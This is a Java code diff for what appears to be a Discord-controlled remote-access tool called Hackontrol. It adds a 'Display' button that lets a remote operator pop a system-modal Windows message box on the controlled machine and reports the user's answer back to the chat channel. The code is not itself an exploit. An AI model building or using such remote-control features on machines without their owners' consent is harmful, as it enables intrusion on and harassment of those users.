@@ -4,6 +4,8 @@ import java.util.List;
 import java.util.function.Consumer;
 
 import com.khopan.hackontrol.HackontrolChannel;
+import com.khopan.hackontrol.NativeLibrary;
+import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
 import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.manager.interaction.InteractionManager;
@@ -91,7 +93,7 @@ public class DialogChannel extends HackontrolChannel {
 				.setMaxValues(1)
 				.build();
 
-		context.reply(instance.toString()).addActionRow(iconMenu).addActionRow(optionMenu).addActionRow(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Edit", Event -> this.replyDialogModal(Event, true, instance)), HackontrolButton.delete()).queue(InteractionManager :: callback);
+		context.reply(instance.toString()).addActionRow(iconMenu).addActionRow(optionMenu).addActionRow(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Display", Event -> this.buttonDisplay(Event, instance)), ButtonManager.dynamicButton(ButtonType.SUCCESS, "Edit", Event -> this.replyDialogModal(Event, true, instance)), HackontrolButton.delete()).queue(InteractionManager :: callback);
 	}
 
 	private <T extends Enum<T>> void storeDefault(StringSelectContext context, Class<T> enumClass, Consumer<T> consumer) {
@@ -102,6 +104,37 @@ public class DialogChannel extends HackontrolChannel {
 		if(!values.isEmpty()) {
 			consumer.accept(Enum.valueOf(enumClass, values.get(0)));
 		}
+	}
+
+	private void buttonDisplay(ButtonContext context, DialogInstance instance) {
+		context.deferEdit().queue();
+		String title = instance.title;
+		String message = instance.message;
+		int flags = WinUser.MB_DEFBUTTON1 | WinUser.MB_SYSTEMMODAL;
+
+		if(instance.icon != null) {
+			flags |= instance.icon.flag;
+		}
+
+		if(instance.optionType != null) {
+			flags |= instance.optionType.flag;
+		}
+
+		int response = NativeLibrary.dialog(title, message, flags);
+		String buttonName = switch(response) {
+		case WinUser.IDOK       -> "Ok";
+		case WinUser.IDCANCEL   -> "Cancel";
+		case WinUser.IDABORT    -> "Abort";
+		case WinUser.IDRETRY    -> "Retry";
+		case WinUser.IDIGNORE   -> "Ignore";
+		case WinUser.IDYES      -> "Yes";
+		case WinUser.IDNO       -> "No";
+		case WinUser.IDCONTINUE -> "Continue";
+		case WinUser.IDTRYAGAIN -> "Try Again";
+		default                 -> "Unknown " + response;
+		};
+
+		context.getChannel().sendMessage("**Button: " + buttonName + "**").addActionRow(HackontrolButton.delete()).queue();
 	}
 
 	private static class DialogInstance {
